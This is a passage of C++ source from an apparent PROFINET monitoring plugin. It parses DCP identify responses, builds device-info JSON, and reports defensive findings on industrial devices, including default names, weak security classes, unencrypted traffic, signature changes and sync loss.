            if (suboption == PROFINET::DCP_SUB_DEV_TYPEOFSTATION && payload_len > 0) {
                size_t copy_len = (payload_len < sizeof(dev_info.type_of_station) - 1) ?
                                  payload_len : sizeof(dev_info.type_of_station) - 1;
                memcpy(dev_info.type_of_station, payload, copy_len);
                dev_info.type_of_station[copy_len] = '\0';
            }
            else if (suboption == PROFINET::DCP_SUB_DEV_NAMEOFSTATION && payload_len > 0) {
                size_t copy_len = (payload_len < sizeof(dev_info.name_of_station) - 1) ?
                                  payload_len : sizeof(dev_info.name_of_station) - 1;
                memcpy(dev_info.name_of_station, payload, copy_len);
                dev_info.name_of_station[copy_len] = '\0';

                // Check if default name
                std::string name_str(dev_info.name_of_station);
                dev_info.is_default_name = isDefaultDeviceName(name_str);
            }
            else if (suboption == PROFINET::DCP_SUB_DEV_ID && payload_len >= 4) {
                dev_info.vendor_id = PROFINETPlugin::rd16be(payload);
                dev_info.device_id = PROFINETPlugin::rd16be(payload + 2);
                // Keep a human label if possible (best-effort).
                const char* vn = vendorIdToName(dev_info.vendor_id);
                if (vn) {
                    strncpy(dev_info.vendor_name, vn, sizeof(dev_info.vendor_name));
                    dev_info.vendor_name[sizeof(dev_info.vendor_name) - 1] = '\0';
                }
            }
            else if (suboption == PROFINET::DCP_SUB_DEV_ROLE && payload_len >= 1) {
                dev_info.device_role = payload[0];
            }
            else if (suboption == PROFINET::DCP_SUB_DEV_OPTIONS && payload_len >= 2) {
                dev_info.device_options = PROFINETPlugin::rd16be(payload);
                dev_info.supports_legacy = (dev_info.device_options & 0x0001) != 0;
                uint8_t sec_bits = (uint8_t)((dev_info.device_options >> 12) & 0x03);
                if (sec_bits <= PROFINET::SECURITY_CLASS_2) {
                    dev_info.security_class = sec_bits;
                }
                if (dev_info.device_options & 0x0100) {
                    dev_info.has_signature = true;
                }
                if (qualifier & 0x0002) {
                    signature_invalid_flag = true;
                    dev_info.signature_valid = false;
                } else if (qualifier & 0x0001) {
                    dev_info.signature_valid = true;
                }
            }
            else if (suboption == PROFINET::DCP_SUB_DEV_SIGNATURE && payload_len > 0) {
                dev_info.has_signature = true;
                dev_info.signature_hash = fnv1a32(payload, payload_len);
                dev_info.signature_length = payload_len;
                if (qualifier & 0x0002) {
                    signature_invalid_flag = true;
                    dev_info.signature_valid = false;
                } else if (qualifier & 0x0001) {
                    dev_info.signature_valid = true;
                }
            }
        }
        else if (option == PROFINET::DCP_OPT_IP) {
            if (suboption == PROFINET::DCP_SUB_IP_MAC && payload_len >= 6) {
                memcpy(dev_info.mac_address, payload, 6);
            }
            else if (suboption == PROFINET::DCP_SUB_IP_PARAMETER && payload_len >= 12) {
                // RFC-style dotted-quad is just 4 octets on the wire; treat as big-endian packed for printing.
                dev_info.ip_address = PROFINETPlugin::rd32be(payload);
                dev_info.netmask = PROFINETPlugin::rd32be(payload + 4);
                dev_info.gateway = PROFINETPlugin::rd32be(payload + 8);
            }
        }
        else if (option == PROFINET::DCP_OPT_DHCP) {
            dev_info.ip_is_dhcp = true;
        }
        else if (option == PROFINET::DCP_OPT_CONTROL) {
            if (suboption == PROFINET::DCP_SUB_CONTROL_ALIAS && payload_len > 0) {
                size_t copy_len = (payload_len < sizeof(dev_info.alias_name) - 1) ?
                                  payload_len : sizeof(dev_info.alias_name) - 1;
                memcpy(dev_info.alias_name, payload, copy_len);
                dev_info.alias_name[copy_len] = '\0';
            } else if (suboption == PROFINET::DCP_SUB_CONTROL_SIGNATURE && payload_len > 0) {
                dev_info.has_signature = true;
                dev_info.signature_hash = fnv1a32(payload, payload_len);
                dev_info.signature_length = payload_len;
                if (qualifier & 0x0002) {
                    signature_invalid_flag = true;
                    dev_info.signature_valid = false;
                } else if (qualifier & 0x0001) {
                    dev_info.signature_valid = true;
                }
            }
        }
        else if (option == PROFINET::DCP_OPT_DEVICEINITIATIVE) {
            if (payload_len >= 1) {
                dev_info.has_sync_status = true;
                dev_info.sync_locked = (payload[0] & 0x01) != 0;
            }
        }

        pos += block_len;
        // DCP blocks are padded to 2-byte boundaries
        if (block_len % 2 != 0) pos++;
    }

    if (dev_info.has_signature && dev_info.signature_length > 0 && !signature_invalid_flag && !dev_info.signature_valid) {
        dev_info.signature_valid = true;
    }

    auto containsKeyword = [](const char* text, const char* keyword) -> bool {
        if (!text || !keyword) return false;
        size_t key_len = strlen(keyword);
        if (key_len == 0) return false;

        for (size_t i = 0; text[i] != '\0'; ++i) {
            size_t j = 0;
            while (text[i + j] != '\0' &&
                   j < key_len &&
                   std::tolower(static_cast<unsigned char>(text[i + j])) ==
                       keyword[j]) {
                ++j;
            }
            if (j == key_len) {
                return true;
            }
        }
        return false;
    };

    const char* type_str = dev_info.type_of_station;
    const char* name_str = dev_info.name_of_station;
    const char* order_str = dev_info.order_id;

    static const char drive_token[] = "drive";
    static const char safe_token[] = "safe";

    if (!dev_info.supports_profidrive) {
        if (containsKeyword(type_str, drive_token) ||
            containsKeyword(name_str, drive_token) ||
            containsKeyword(order_str, drive_token)) {
            dev_info.supports_profidrive = true;
        }
    }

    if (!dev_info.supports_profisafe) {
        if (containsKeyword(type_str, safe_token) ||
            containsKeyword(name_str, safe_token) ||
            containsKeyword(order_str, safe_token)) {
            dev_info.supports_profisafe = true;
        }
    }

    dev_info.is_configured = (dev_info.ip_address != 0);
    return true;
}

bool PROFINETPlugin::buildDeviceInfoJSON(const PROFINETDeviceInfo& dev_info, psram_string& out_json) {
    out_json.clear();
    out_json += PSRAMUtils::createPSRAMString("{");

    // Basic device information
    out_json += PSRAMUtils::createPSRAMString("\"name_of_station\":\"");
    out_json += PSRAMUtils::createPSRAMString(dev_info.name_of_station);
    out_json += PSRAMUtils::createPSRAMString("\",");

    out_json += PSRAMUtils::createPSRAMString("\"type_of_station\":\"");
    out_json += PSRAMUtils::createPSRAMString(dev_info.type_of_station);
    out_json += PSRAMUtils::createPSRAMString("\",");

    out_json += PSRAMUtils::createPSRAMString("\"alias_name\":\"");
    out_json += PSRAMUtils::createPSRAMString(dev_info.alias_name);
    out_json += PSRAMUtils::createPSRAMString("\",");

    // MAC address
    char mac_buf[24];
    snprintf(mac_buf, sizeof(mac_buf), "\"%02X:%02X:%02X:%02X:%02X:%02X\"",
             dev_info.mac_address[0], dev_info.mac_address[1], dev_info.mac_address[2],
             dev_info.mac_address[3], dev_info.mac_address[4], dev_info.mac_address[5]);
    out_json += PSRAMUtils::createPSRAMString("\"mac_address\":");
    out_json += PSRAMUtils::createPSRAMString(mac_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    // IP address information
    auto fmt_ipv4 = [](uint32_t be) -> std::string {
        // dev_info stores IPv4 as a big-endian packed value (C0A80101 for 192.168.1.1).
        // Do not cast to bytes on little-endian CPUs.
        char b[32];
        snprintf(b, sizeof(b), "%u.%u.%u.%u",
                 (unsigned)((be >> 24) & 0xFF),
                 (unsigned)((be >> 16) & 0xFF),
                 (unsigned)((be >> 8) & 0xFF),
                 (unsigned)(be & 0xFF));
        return std::string(b);
    };

    if (dev_info.ip_address != 0) {
        out_json += PSRAMUtils::createPSRAMString("\"ip_address\":");
        out_json += PSRAMUtils::createPSRAMString("\"");
        out_json += PSRAMUtils::createPSRAMString(fmt_ipv4(dev_info.ip_address).c_str());
        out_json += PSRAMUtils::createPSRAMString("\",");

        out_json += PSRAMUtils::createPSRAMString("\"netmask\":");
        out_json += PSRAMUtils::createPSRAMString("\"");
        out_json += PSRAMUtils::createPSRAMString(fmt_ipv4(dev_info.netmask).c_str());
        out_json += PSRAMUtils::createPSRAMString("\",");

        out_json += PSRAMUtils::createPSRAMString("\"gateway\":");
        out_json += PSRAMUtils::createPSRAMString("\"");
        out_json += PSRAMUtils::createPSRAMString(fmt_ipv4(dev_info.gateway).c_str());
        out_json += PSRAMUtils::createPSRAMString("\",");
    }

    // Vendor and device IDs
    char id_buf[64];
    snprintf(id_buf, sizeof(id_buf), "%u", dev_info.vendor_id);
    out_json += PSRAMUtils::createPSRAMString("\"vendor_id\":");
    out_json += PSRAMUtils::createPSRAMString(id_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"vendor_name\":\"");
    const char* vname = dev_info.vendor_name[0] ? dev_info.vendor_name : vendorIdToName(dev_info.vendor_id);
    out_json += PSRAMUtils::createPSRAMString(vname ? vname : "");
    out_json += PSRAMUtils::createPSRAMString("\",");

    snprintf(id_buf, sizeof(id_buf), "%u", dev_info.device_id);
    out_json += PSRAMUtils::createPSRAMString("\"device_id\":");
    out_json += PSRAMUtils::createPSRAMString(id_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"order_id\":\"");
    out_json += PSRAMUtils::createPSRAMString(dev_info.order_id);
    out_json += PSRAMUtils::createPSRAMString("\",");

    out_json += PSRAMUtils::createPSRAMString("\"serial_number\":\"");
    out_json += PSRAMUtils::createPSRAMString(dev_info.serial_number);
    out_json += PSRAMUtils::createPSRAMString("\",");

    // Device role
    out_json += PSRAMUtils::createPSRAMString("\"device_role\":\"");
    out_json += PSRAMUtils::createPSRAMString(deviceRoleToString(dev_info.device_role));
    out_json += PSRAMUtils::createPSRAMString("\",");

    // Security information
    snprintf(id_buf, sizeof(id_buf), "%u", dev_info.security_class);
    out_json += PSRAMUtils::createPSRAMString("\"security_class\":");
    out_json += PSRAMUtils::createPSRAMString(id_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    // Flags
    out_json += PSRAMUtils::createPSRAMString("\"is_configured\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.is_configured ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"is_default_name\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.is_default_name ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"ip_is_dhcp\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.ip_is_dhcp ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"has_signature\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.has_signature ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"signature_valid\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.signature_valid ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    snprintf(id_buf, sizeof(id_buf), "%u", dev_info.signature_length);
    out_json += PSRAMUtils::createPSRAMString("\"signature_length\":");
    out_json += PSRAMUtils::createPSRAMString(id_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"sync_locked\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.sync_locked ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    snprintf(id_buf, sizeof(id_buf), "\"0x%04X\"", dev_info.device_options);
    out_json += PSRAMUtils::createPSRAMString("\"device_options_raw_hex\":");
    out_json += PSRAMUtils::createPSRAMString(id_buf);
    out_json += PSRAMUtils::createPSRAMString(",");

    // Human-friendly decode of the most relevant option bits we currently use.
    out_json += PSRAMUtils::createPSRAMString("\"device_options_explained\":{");
    out_json += PSRAMUtils::createPSRAMString("\"legacy_protocols_supported\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.supports_legacy ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",\"signature_capable\":");
    out_json += PSRAMUtils::createPSRAMString((dev_info.device_options & 0x0100) ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",\"security_class\":");
    char sbuf[16]; snprintf(sbuf, sizeof(sbuf), "%u", (unsigned)dev_info.security_class);
    out_json += PSRAMUtils::createPSRAMString(sbuf);
    out_json += PSRAMUtils::createPSRAMString(",\"security_class_label\":\"");
    const char* scl = "unknown";
    if (dev_info.security_class == 0) scl = "none";
    else if (dev_info.security_class == 1) scl = "class_1";
    else if (dev_info.security_class == 2) scl = "class_2";
    out_json += PSRAMUtils::createPSRAMString(scl);
    out_json += PSRAMUtils::createPSRAMString("\"}");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"supports_profidrive\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.supports_profidrive ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(",");

    out_json += PSRAMUtils::createPSRAMString("\"supports_profisafe\":");
    out_json += PSRAMUtils::createPSRAMString(dev_info.supports_profisafe ? "true" : "false");

    // Optional: LLDP neighbor/topology hint (best-effort)
    {
        const uint64_t key = macToKey(dev_info.mac_address);
        LldpInfo li{};
        bool has = false;
        {
            std::lock_guard<std::mutex> lk(topo_mutex_);
            auto it = lldp_by_mac_.find(key);
            if (it != lldp_by_mac_.end()) {
                li = it->second;
                has = true;
            }
        }
        if (has) {
            out_json += PSRAMUtils::createPSRAMString(",\"lldp\":{");
            out_json += PSRAMUtils::createPSRAMString("\"chassis_id\":\"");
            out_json += PSRAMUtils::createPSRAMString(li.chassis_id);
            out_json += PSRAMUtils::createPSRAMString("\",\"port_id\":\"");
            out_json += PSRAMUtils::createPSRAMString(li.port_id);
            out_json += PSRAMUtils::createPSRAMString("\",\"system_name\":\"");
            out_json += PSRAMUtils::createPSRAMString(li.system_name);
            out_json += PSRAMUtils::createPSRAMString("\",\"port_desc\":\"");
            out_json += PSRAMUtils::createPSRAMString(li.port_desc);
            out_json += PSRAMUtils::createPSRAMString("\",\"ttl\":");
            char nb[64];
            snprintf(nb, sizeof(nb), "%u", (unsigned)li.ttl);
            out_json += PSRAMUtils::createPSRAMString(nb);
            out_json += PSRAMUtils::createPSRAMString(",\"has_profinet_org\":");
            out_json += PSRAMUtils::createPSRAMString(li.has_profinet_org ? "true" : "false");
            snprintf(nb, sizeof(nb), ",\"profinet_subtype\":%u", (unsigned)li.profinet_subtype);
            out_json += PSRAMUtils::createPSRAMString(nb);
            snprintf(nb, sizeof(nb), ",\"profinet_payload_hash\":%u", (unsigned)li.profinet_payload_hash);
            out_json += PSRAMUtils::createPSRAMString(nb);
            snprintf(nb, sizeof(nb), ",\"last_seen_ms\":%llu", (unsigned long long)li.last_seen_ms);
            out_json += PSRAMUtils::createPSRAMString(nb);
            out_json += PSRAMUtils::createPSRAMString("}");
        }
    }

    // Optional: DCP blocks summary (debug aid; helps map suboptions from real devices)
    if (dev_info.dcp_blocks_count > 0) {
        auto opt_name = [](uint8_t opt) -> const char* {
            switch (opt) {
                case 1: return "IP";
                case 2: return "Device";
                case 3: return "DHCP";
                case 5: return "Control";
                default: return "Unknown";
            }
        };
        auto sub_name = [](uint8_t opt, uint8_t sub) -> const char* {
            if (opt == 1) {
                if (sub == 1) return "MAC";
                if (sub == 2) return "IP Parameter";
                return "Unknown";
            }
            if (opt == 2) {
                if (sub == 1) return "Type of Station";
                if (sub == 2) return "Name of Station";
                if (sub == 3) return "Device ID";
                if (sub == 4) return "Device Role";
                if (sub == 5) return "Device Options";
                if (sub == 6) return "Alias Name";
                if (sub == 7) return "Device Instance";
                return "Unknown";
            }
            if (opt == 5) {
                if (sub == 1) return "Start";
                if (sub == 2) return "Stop";
                if (sub == 3) return "Signal";
                if (sub == 4) return "Response";
                return "Unknown";
            }
            return "Unknown";
        };

        out_json += PSRAMUtils::createPSRAMString(",\"dcp_blocks\":[");
        for (uint8_t i = 0; i < dev_info.dcp_blocks_count; ++i) {
            const auto& b = dev_info.dcp_blocks[i];
            if (i) out_json += PSRAMUtils::createPSRAMString(",");
            char prev[64];
            bytes_to_hex(prev, sizeof(prev), b.preview, sizeof(b.preview));
            const char* on = opt_name(b.option);
            const char* sn = sub_name(b.option, b.suboption);

            // Build a short "meaning" field (human-friendly). Keep it descriptive (avoid opaque codes).
            char meaning[220];
            meaning[0] = '\0';
            if (b.option == 2 && b.suboption == 1) {
                snprintf(meaning, sizeof(meaning), "Type of Station (device model/type string).");
            } else if (b.option == 2 && b.suboption == 2) {
                snprintf(meaning, sizeof(meaning), "Name of Station (device station name / identifier).");
            } else if (b.option == 2 && b.suboption == 3 && dev_info.vendor_id) {
                snprintf(meaning, sizeof(meaning), "Device identifiers: vendor_id=%u, device_id=%u.", (unsigned)dev_info.vendor_id, (unsigned)dev_info.device_id);
            } else if (b.option == 2 && b.suboption == 4) {
                snprintf(meaning, sizeof(meaning), "Device role: %s.", deviceRoleToString(dev_info.device_role));
            } else if (b.option == 2 && b.suboption == 5) {
                snprintf(meaning, sizeof(meaning), "Device options/capabilities (bitmask) and derived security class=%u.", (unsigned)dev_info.security_class);
            } else if (b.option == 1 && b.suboption == 2 && dev_info.ip_address) {
                snprintf(meaning, sizeof(meaning), "IP parameters: ip=%s, netmask=%s, gateway=%s.",
                         fmt_ipv4(dev_info.ip_address).c_str(),
                         fmt_ipv4(dev_info.netmask).c_str(),
                         fmt_ipv4(dev_info.gateway).c_str());
            }

            // Keep this buffer comfortably large: we include human-friendly fields and optional "meaning".
            // We intentionally avoid truncation because this JSON is used for UI/debug.
            char obuf[768];
            snprintf(obuf, sizeof(obuf),
                     "{\"option_code\":%u,\"option_name\":\"%s\",\"suboption_code\":%u,\"suboption_name\":\"%s\","
                     "\"qualifier_code\":%u,\"payload_length\":%u,\"payload_hash_fnv1a32\":%u,\"payload_preview_hex\":\"%s\"%s%s%s}",
                     (unsigned)b.option, on, (unsigned)b.suboption, sn,
                     (unsigned)b.qualifier, (unsigned)b.payload_len, (unsigned)b.payload_hash, prev,
                     (meaning[0] ? ",\"meaning\":\"" : ""),
                     (meaning[0] ? meaning : ""),
                     (meaning[0] ? "\"" : ""));
            out_json += PSRAMUtils::createPSRAMString(obuf);
        }
        out_json += PSRAMUtils::createPSRAMString("]");
    }

    out_json += PSRAMUtils::createPSRAMString("}");
    return true;
}

// ==================== FASE 5: PROFINET Vulnerability Checks Implementation ====================

bool PROFINETPlugin::checkDefaultDeviceName(const PROFINETDeviceInfo& dev_info, psram_string& finding) {
    if (!config_.check_default_names) return false;

    if (dev_info.is_default_name) {
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"profinet_default_name\","
            "\"severity\":\"MEDIUM\","
            "\"device\":\"");
        finding += PSRAMUtils::createPSRAMString(dev_info.name_of_station);
        finding += PSRAMUtils::createPSRAMString(
            "\",\"detail\":\"Device uses default/generic name - should be uniquely identified\"}"
        );

        LOG_WARNINGF(TAG_PN, "Vulnerability: Default device name '%s'", dev_info.name_of_station);
        return true;
    }

    return false;
}

bool PROFINETPlugin::checkSecurityClass(const PROFINETDeviceInfo& dev_info, psram_string& finding) {
    if (!config_.check_security_class) return false;

    if (dev_info.security_class == PROFINET::SECURITY_CLASS_NONE) {
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"profinet_no_security\","
            "\"severity\":\"CRITICAL\","
            "\"device\":\"");
        finding += PSRAMUtils::createPSRAMString(dev_info.name_of_station);
        finding += PSRAMUtils::createPSRAMString(
            "\",\"detail\":\"Device has no security class (0) - no integrity or confidentiality protection\"}"
        );

        return true;
    }
    else if (dev_info.security_class == PROFINET::SECURITY_CLASS_1) {
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"profinet_weak_security\","
            "\"severity\":\"MEDIUM\","
            "\"device\":\"");
        finding += PSRAMUtils::createPSRAMString(dev_info.name_of_station);
        finding += PSRAMUtils::createPSRAMString(
            "\",\"detail\":\"Device uses Security Class 1 (basic integrity only) - no confidentiality\"}"
        );

        return true;
    }

    // Security Class 2 is considered secure
    return false;
}

bool PROFINETPlugin::checkUnencryptedComm(const PROFINETDeviceInfo& dev_info, psram_string& finding) {
    if (!config_.check_unencrypted_comm) return false;

    // PROFINET devices responding to DCP are using unencrypted Layer 2 communication
    // This is inherent to the protocol but should be noted for security assessment
    if (dev_info.security_class < PROFINET::SECURITY_CLASS_2) {
        finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"profinet_unencrypted\","
            "\"severity\":\"LOW\","
            "\"device\":\"");
        finding += PSRAMUtils::createPSRAMString(dev_info.name_of_station);
        finding += PSRAMUtils::createPSRAMString(
            "\",\"detail\":\"Device communication is unencrypted (DCP/RT) - upgrade to Security Class 2 recommended\"}"
        );

        return true;
    }

    return false;
}

bool PROFINETPlugin::checkDigitalSignature(const PROFINETDeviceInfo& dev_info, psram_string& finding) {
    finding.clear();

    bool signature_expected = (dev_info.security_class >= PROFINET::SECURITY_CLASS_1) ||
                              (dev_info.device_options & 0x0100);

    if (!dev_info.has_signature && signature_expected) {
        PSRAMUtils::ScopedBuffer buf(256);
        if (!buf.valid()) return false;
        snprintf(buf.get(), buf.size(),
                 "{\"id\":\"profinet_signature_missing\",\"severity\":\"MEDIUM\",\"detail\":\"Device lacks digital signature despite security requirements\"}");
        finding = PSRAMUtils::createPSRAMString(buf.get());
        return true;
    }

    if (dev_info.has_signature && (!dev_info.signature_valid || dev_info.signature_length == 0)) {
        PSRAMUtils::ScopedBuffer buf(256);
        if (!buf.valid()) return false;
        snprintf(buf.get(), buf.size(),
                 "{\"id\":\"profinet_signature_invalid\",\"severity\":\"HIGH\",\"detail\":\"Device reports invalid PROFINET signature block\"}");
        finding = PSRAMUtils::createPSRAMString(buf.get());
        return true;
    }

    return false;
}

uint64_t PROFINETPlugin::macToKey(const uint8_t mac[6]) {
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) {
        key = (key << 8) | mac[i];
    }
    return key;
}

bool PROFINETPlugin::evaluateDeviceSignature(const PROFINETDeviceInfo& dev_info,
                                             const uint8_t responder_mac[6],
                                             const NetworkPacket& pkt) {
    bool event_reported = false;
    uint64_t mac_key = macToKey(dev_info.mac_address);
    if (mac_key == 0) {
        mac_key = macToKey(responder_mac);
    }
    if (mac_key == 0) {
        mac_key = 0xFFFFFFFFFFFFULL;
    }

    psram_string target_ps;
    if (dev_info.name_of_station[0] != '\0') {
        target_ps = PSRAMUtils::createPSRAMString(dev_info.name_of_station);
    } else {
        psram_string mac_str = mac_to_str(responder_mac);
        target_ps = mac_str;
    }

    psram_string finding;
    if (checkDigitalSignature(dev_info, finding)) {
        bool is_missing = finding.find("signature_missing") != psram_string::npos;
        if (is_missing) {
            if (signature_missing_alerted_.insert(mac_key).second) {
                reportVulnerabilityPSRAM(target_ps, finding, LogLevel::WARNING);
                event_reported = true;
            }
        } else {
            if (signature_invalid_alerted_.insert(mac_key).second) {
                reportVulnerabilityPSRAM(target_ps, finding, LogLevel::ERROR);
                event_reported = true;
            }
        }
    }

    if (dev_info.has_signature && dev_info.signature_length > 0 && dev_info.signature_valid) {
        auto it = signature_hash_cache_.find(mac_key);
        if (it == signature_hash_cache_.end()) {
            signature_hash_cache_[mac_key] = dev_info.signature_hash;
        } else if (it->second != dev_info.signature_hash) {
            if (signature_mismatch_alerted_.insert(mac_key).second) {
                PSRAMUtils::ScopedBuffer buf(256);
                if (buf.valid()) {
                    psram_string mac_str = mac_to_str(responder_mac);
                    snprintf(buf.get(), buf.size(),
                             "{\"type\":\"profinet_signature_mismatch\",\"device\":\"%s\"}",
                             mac_str.c_str());
                    reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::ERROR);
                }
                event_reported = true;
            }
            signature_hash_cache_[mac_key] = dev_info.signature_hash;
        }
    }

    if (checkDefaultDeviceName(dev_info, finding)) {
        if (default_name_reported_.insert(mac_key).second) {
            reportVulnerabilityPSRAM(target_ps, finding, LogLevel::WARNING);
            event_reported = true;
        }
    }

    if (checkSecurityClass(dev_info, finding)) {
        LogLevel level = (dev_info.security_class == PROFINET::SECURITY_CLASS_NONE) ? LogLevel::ERROR : LogLevel::WARNING;
        if (security_class_reported_.insert(mac_key).second) {
            reportVulnerabilityPSRAM(target_ps, finding, level);
            event_reported = true;
        }
    }

    if (checkUnencryptedComm(dev_info, finding)) {
        if (unencrypted_reported_.insert(mac_key).second) {
            reportVulnerabilityPSRAM(target_ps, finding, LogLevel::INFO);
            event_reported = true;
        }
    }

    if (dev_info.supports_profidrive) {
        if (profidrive_reported_.insert(mac_key).second) {
            PSRAMUtils::ScopedBuffer buf(256);
            if (buf.valid()) {
                snprintf(buf.get(), buf.size(),
                         "{\"id\":\"profinet_profidrive\",\"severity\":\"INFO\",\"device\":\"%s\",\"detail\":\"Device advertises PROFIdrive support\"}",
                         target_ps.c_str());
                reportVulnerabilityPSRAM(target_ps, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::INFO);
            }
            event_reported = true;
        }
    }

    if (dev_info.supports_profisafe) {
        LogLevel level = (dev_info.security_class < PROFINET::SECURITY_CLASS_2) ? LogLevel::WARNING : LogLevel::INFO;
        bool inserted = profisafe_reported_.insert(mac_key).second;
        if (inserted || dev_info.security_class < PROFINET::SECURITY_CLASS_2) {
            PSRAMUtils::ScopedBuffer buf(320);
            if (buf.valid()) {
                const char* severity_str = (dev_info.security_class < PROFINET::SECURITY_CLASS_2) ? "WARNING" : "INFO";
                const char* action = (dev_info.security_class < PROFINET::SECURITY_CLASS_2)
                    ? "Enable Security Class 2 for PROFIsafe integrity/confidentiality"
                    : "PROFIsafe channel detected";
                snprintf(buf.get(), buf.size(),
                         "{\"id\":\"profinet_profisafe\",\"severity\":\"%s\",\"device\":\"%s\",\"detail\":\"%s\"}",
                         severity_str, target_ps.c_str(), action);
                reportVulnerabilityPSRAM(target_ps, PSRAMUtils::createPSRAMString(buf.get()), level);
            }
            event_reported = true;
        }
    }

    return event_reported;
}

bool PROFINETPlugin::updateSyncStateFromIdentify(const PROFINETDeviceInfo& dev_info,
                                                 const uint8_t responder_mac[6],
                                                 const NetworkPacket& pkt) {
    if (!dev_info.has_sync_status) {
        return false;
    }

    uint64_t mac_key = macToKey(dev_info.mac_address);
    if (mac_key == 0) {
        mac_key = macToKey(responder_mac);
        if (mac_key == 0) {
            mac_key = 0xFFFFFFFFFFFFULL;
        }
    }

    std::lock_guard<std::mutex> lock(sync_mutex_);
    SyncState& state = sync_states_[mac_key];
    bool event_reported = false;
    if (dev_info.sync_locked) {
        state.locked = true;
        state.valid_streak = 8;
        state.invalid_streak = 0;
        sync_loss_alerted_.erase(mac_key);
    } else {
        state.locked = false;
        state.valid_streak = 0;
        if (sync_loss_alerted_.insert(mac_key).second) {
            PSRAMUtils::ScopedBuffer buf(256);
            if (buf.valid()) {
                psram_string mac_str = mac_to_str(responder_mac);
                snprintf(buf.get(), buf.size(),
                         "{\"type\":\"profinet_sync_unlocked\",\"device\":\"%s\",\"source\":\"identify\"}",
                         mac_str.c_str());
                reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::WARNING);
            }
            event_reported = true;
        }
    }

    return event_reported;
}

bool PROFINETPlugin::trackSyncFromRt(uint64_t mac_key, bool data_valid, const NetworkPacket& pkt, bool is_irt) {
    std::lock_guard<std::mutex> lock(sync_mutex_);
    SyncState& state = sync_states_[mac_key];
    bool event_reported = false;
    if (data_valid) {
        if (state.valid_streak < 255) state.valid_streak++;
        state.invalid_streak = 0;
        if (!state.locked && state.valid_streak >= 3) {
            state.locked = true;
            sync_loss_alerted_.erase(mac_key);
            if (is_irt) {
                PSRAMUtils::ScopedBuffer buf(256);
                if (buf.valid()) {
                    psram_string mac_str = mac_to_str(pkt.src_mac);
                    snprintf(buf.get(), buf.size(),
                             "{\"type\":\"profinet_sync_locked\",\"device\":\"%s\",\"source\":\"rt\"}",
                             mac_str.c_str());
                    reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::INFO);
                }
                event_reported = true;
            }
        }
    } else {
        state.valid_streak = 0;
        if (state.invalid_streak < 255) state.invalid_streak++;
        if (state.locked && state.invalid_streak >= 3) {
            state.locked = false;
            if (sync_loss_alerted_.insert(mac_key).second) {
                PSRAMUtils::ScopedBuffer buf(256);
                if (buf.valid()) {
                    psram_string mac_str = mac_to_str(pkt.src_mac);
                    snprintf(buf.get(), buf.size(),
                             "{\"type\":\"profinet_sync_loss\",\"device\":\"%s\",\"source\":\"rt\"}",
                             mac_str.c_str());
                    reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()),
                                         is_irt ? LogLevel::ERROR : LogLevel::WARNING);
                }
                event_reported = true;
            }
        }
    }

    return event_reported;
}

bool PROFINETPlugin::processRtFrame(const NetworkPacket& pkt, uint16_t frame_id, bool is_irt) {
    if (pkt.length < 18) {
        return false;
    }

    const uint8_t* rt = pkt.data;
    uint8_t cycle_counter = rt[16];
    uint8_t data_status = rt[17];
    bool data_valid = (data_status & 0x01) != 0;

    uint64_t mac_key = macToKey(pkt.src_mac);
    if (mac_key == 0) {
        mac_key = 0xFFFFFFFFFFFFULL;
    }

    bool alert_generated = false;
    if (trackSyncFromRt(mac_key, data_valid, pkt, is_irt)) {
        alert_generated = true;
    }

    uint64_t channel_key = (static_cast<uint64_t>(frame_id) << 48) | mac_key;
    {
        std::lock_guard<std::mutex> lock(rt_mutex_);
        RtChannelState& channel = rt_channels_[channel_key];

        if (channel.samples == 0) {
            channel.last_ts_ms = pkt.ts_ms;
            channel.last_cycle = cycle_counter;
            channel.samples = 1;
            channel.is_irt = is_irt;
            if (is_irt) {
                PSRAMUtils::ScopedBuffer buf(256);
                if (buf.valid()) {
                    psram_string mac_str = mac_to_str(pkt.src_mac);
                    snprintf(buf.get(), buf.size(),
                             "{\"type\":\"profinet_irt_detected\",\"device\":\"%s\",\"frame_id\":\"0x%04X\"}",
                             mac_str.c_str(), frame_id);
                    reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::INFO);
                }
                alert_generated = true;
            }
        } else {
            uint8_t delta_cycles = static_cast<uint8_t>(cycle_counter - channel.last_cycle);
